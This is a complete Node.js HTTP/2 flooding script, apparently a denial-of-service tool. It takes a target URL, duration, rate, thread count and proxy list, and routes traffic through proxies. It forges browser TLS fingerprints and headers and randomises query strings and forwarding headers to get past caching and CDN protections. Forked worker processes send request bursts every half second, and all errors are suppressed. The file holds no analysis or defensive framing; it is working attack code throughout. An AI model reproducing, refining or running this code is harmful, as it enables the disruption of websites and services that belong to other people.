const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const randomUseragent = require('random-useragent');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml'
];

const cache_header = [
    'max-age=0',
    'no-cache',
    'no-store',
    'must-revalidate',
    'proxy-revalidate',
    's-maxage=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'max-age=31536000,public',
    'public, immutable, max-age=31536000',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'max-age=31536000,public,immutable'
];

const encoding_header = [
    '*',
    '*/*',
    'gzip',
    'gzip, deflate, br',
    'compress, gzip',
    'deflate, gzip',
    'gzip, identity',
    'br',
    'identity',
    'gzip, deflate, lzma, sdch',
    'compress',
    'deflate'
];

const language_header = [
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.9',
    'ko-KR',
    'zh-CN',
    'ja-JP',
    'de-DE',
    'es-ES',
    'ar-EG'
];

const dest_header = ['document', 'empty', 'iframe', 'script', 'style', 'image', 'font', 'audio', 'video'];
const mode_header = ['cors', 'navigate', 'no-cors', 'same-origin', 'websocket'];
const site_header = ['cross-site', 'same-origin', 'same-site', 'none'];

const sec_ch_ua = [
    '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    '"Chromium";v="116", "Not)A;Brand";v="8", "Google Chrome";v="116"',
    '"Chromium";v="115", "Not)A;Brand";v="99", "Google Chrome";v="115"',
    '"Chromium";v="114", "Not)A;Brand";v="24", "Google Chrome";v="114"'
];

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [defaultCiphers[2], defaultCiphers[1], defaultCiphers[0], ...defaultCiphers.slice(3)].join(":");

const sigalgs = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
    'hmac_sha256',
    'hmac_sha1'
].join(':');

const secureOptions = 
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.SSL_OP_NO_TLSv1_3 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";
const secureContext = tls.createSecureContext({
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
});

const operatingSystems = [
    "Windows NT 10.0; Win64; x64",
    "Macintosh; Intel Mac OS X 10_15_7",
    "X11; Linux x86_64",
    "Android 10; Mobile",
    "iPhone; CPU iPhone OS 14_2 like Mac OS X"
];

const architectures = {
    "Windows NT 10.0; Win64; x64": "WOW64",
    "Macintosh; Intel Mac OS X 10_15_7": "x86_64",
    "X11; Linux x86_64": "x86_64",
    "Android 10; Mobile": "armv7l",
    "iPhone; CPU iPhone OS 14_2 like Mac OS X": "arm64"
};

const rateHeaders = [
    {"akamai-origin-hop": randstr(12)},
    {"proxy-client-ip": randstr(12)},
    {"via": randstr(12)},
    {"cluster-ip": randstr(12)},
    {"x-forwarded-for": randstr(12)},
    {"x-forwarded-host": randstr(12)},
    {"x-vercel-cache": randstr(12)},
    {"x-xss-protection": "1;mode=block"},
    {"x-content-type-options": "nosniff"}
];

if (process.argv.length < 6) {
    console.log('node script.js target time rate threads proxyfile');
    process.exit();
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

const proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    console.clear();
    console.log(`Target: ${process.argv[2]}`);
    console.log(`Time: ${process.argv[3]}`);
    console.log(`Rate: ${process.argv[4]}`);
    console.log(`Thread(s): ${process.argv[5]}`);
    console.log(`ProxyFile: ${args.proxyFile} | Total: ${proxies.length}`);
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 500);
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(options.timeout * 600000);
        connection.setKeepAlive(true, 100000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (!isAlive) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, `error: ${error}`);
        });
    }
}

const Socker = new NetSocket();

function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol === "https:" ? "443" : "80";
    const randomOS = randomElement(operatingSystems);
    const randomArch = architectures[randomOS];
    const userAgent = randomUseragent.getRandom(ua => ua.browserName === 'Firefox') || 
        `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124`;

    const headers = {
        ":authority": Math.random() < 0.5 ? parsedTarget.host : `www.${parsedTarget.host}`,
        ":method": "GET",
        ":path": parsedTarget.path + "?" + randstr(10) + "=" + randstr(5),
        ":scheme": "https",
        "accept": randomElement(accept_header),
        "accept-encoding": randomElement(encoding_header),
        "accept-language": randomElement(language_header),
        "sec-ch-ua": randomElement(sec_ch_ua),
        "sec-ch-ua-platform": "Windows",
        "sec-ch-ua-mobile": "?0",
        "sec-fetch-mode": randomElement(mode_header),
        "sec-fetch-dest": randomElement(dest_header),
        "sec-fetch-site": randomElement(site_header),
        "user-agent": userAgent,
        "x-requested-with": "XMLHttpRequest",
        "cache-control": randomElement(cache_header),
        "upgrade-insecure-requests": "1",
        "referer": `https://${parsedTarget.host}${parsedTarget.path}`,
        "x-forwarded-for": randstr(12),
        "x-forwarded-host": parsedTarget.host,
        ...randomElement(rateHeaders)
    };

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 15
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 100000);
        connection.setNoDelay(true);

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ['h2', 'http/1.1'],
            ciphers: ciphers,
            sigalgs: sigalgs,
            ecdhCurve: 'GREASE:X25519:x25519',
            host: parsedTarget.host,
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            secureOptions: secureOptions,
            secureContext: secureContext,
            socket: connection,
            clientTimeout: 20000,
            clientlareMaxTimeout: 5000,
            challengeToSolve: 45
        };

        const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);
        tlsConn.setNoDelay(true);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 10000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                maxFrameSize: 40000,
                enablePush: false
            },
            maxSessionMemory: 3333,
            createConnection: () => tlsConn
        });

        client.setMaxListeners(0);

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const dynHeaders = {
                        ...headers,
                        "akamai-origin-hop": randstr(12),
                        "via": randstr(12),
                        "cluster-ip": randstr(12),
                        "x-vercel-cache": randstr(12)
                    };
                    const request = client.request(dynHeaders);

                    request.on("response", () => {
                        request.close();
                        request.destroy();
                    });

                    request.end();
                }
            }, 500);
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
        });

        client.on("error", () => {
            client.destroy();
            connection.destroy();
        });
    });
}

setTimeout(() => process.exit(1), args.time * 1000);

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
